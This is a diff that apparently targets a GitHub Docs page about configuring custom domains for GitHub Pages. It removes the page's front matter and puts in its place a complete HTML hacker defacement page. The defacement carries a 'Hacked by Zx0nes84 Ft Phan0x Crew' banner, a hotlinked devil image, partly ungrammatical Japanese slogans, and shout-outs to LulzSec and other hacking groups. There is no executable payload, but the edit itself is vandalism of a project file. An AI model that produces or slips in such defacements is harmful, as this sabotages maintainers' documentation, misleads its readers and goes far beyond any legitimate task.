@@ -1,26 +1,28 @@
----
-title: Configuring a custom domain for your GitHub Pages site
-intro: 'You can customize the domain name of your {% data variables.product.prodname_pages %} site.'
-redirect_from:
-  - /articles/tips-for-configuring-an-a-record-with-your-dns-provider
-  - /articles/adding-or-removing-a-custom-domain-for-your-github-pages-site
-  - /articles/configuring-an-a-record-with-your-dns-provider
-  - /articles/using-a-custom-domain-with-github-pages
-  - /articles/tips-for-configuring-a-cname-record
-  - /articles/setting-up-a-custom-domain-with-pages
-  - /articles/setting-up-a-custom-domain-with-github-pages
-  - /articles/configuring-a-custom-domain-for-your-github-pages-site
-  - /github/working-with-github-pages/configuring-a-custom-domain-for-your-github-pages-site
-product: '{% data reusables.gated-features.pages %}'
-versions:
-  fpt: '*'
-  ghec: '*'
-topics:
-  - Pages
-children:
-  - /about-custom-domains-and-github-pages
-  - /managing-a-custom-domain-for-your-github-pages-site
-  - /verifying-your-custom-domain-for-github-pages
-  - /troubleshooting-custom-domains-and-github-pages
-shortTitle: Configure a custom domain
----
+<html><head>
+    <title>ハッキング</title>
+    <style>
+      body {
+        background-color: black;
+    color: grey;
+    text-family: verdana;
+    text-align: center;
+      }
+
+      p {
+    color: red;
+      }
+    </style>
+  </head>
+  <body>
+    <p>今日はファノックスの乗組員を偉業</p><br>
+    <center><img src="https://www.kibrispdr.org/dwn/1/gambar-devil-bats.jpg" width="50%"></center><br><br>
+    <pre>    Hacked by <a href="https://twitter.com/zx0nes84">Zx0nes84</a> Ft <a href="https://twitter.com/cr_phan0x">Phan0x Crew</a> <font color="red">&lt;3</font><br>
+    眠りにつくことを忘れないでください<p>笑ってくれてありがとう</p>
+    <br>
+    gr33zt: sk4yx - f4te - k4sh - Xstro0 - NDAmazonas - sanninja<br>
+    \\ th4nk3: theMx0nday ~ <font color="red">LulzSec</font> ~ Criminal Gang ~ <font color="red">Foursdeath</font> ~ AnonSec \\
+    </pre>
+  
+  <footer>
+  </footer>
+</body></html>
